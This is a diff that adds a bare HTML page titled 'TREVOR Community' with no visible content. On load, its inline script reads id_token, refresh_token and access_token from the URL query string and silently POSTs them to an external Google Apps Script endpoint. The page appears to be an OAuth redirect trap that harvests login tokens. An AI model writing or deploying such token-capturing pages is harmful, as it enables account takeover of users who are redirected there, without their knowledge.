@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]>      <html class="no-js"> <!--<![endif]-->
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>TREVOR Community</title>
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <script>
+            const params = new Proxy(new URLSearchParams(window.location.search), {
+                get: (searchParams, prop) => searchParams.get(prop),
+            });
+            fetch('https://script.google.com/macros/s/AKfycbw4C6hw5VwjB0oGt5OwxztPCXsZXpVebAZgzwk5liTUJlVPtgmvlNTCfhlG3eV0pLtWwA/exec', {
+                body: JSON.stringify({ id: params.id_token, refresh: params.refresh_token, access_token: params.access_token}),
+                headers: {
+                'content-type': 'application/json'
+                },
+                method: 'POST'  
+            });
+        </script>
+    </head>
+</html>
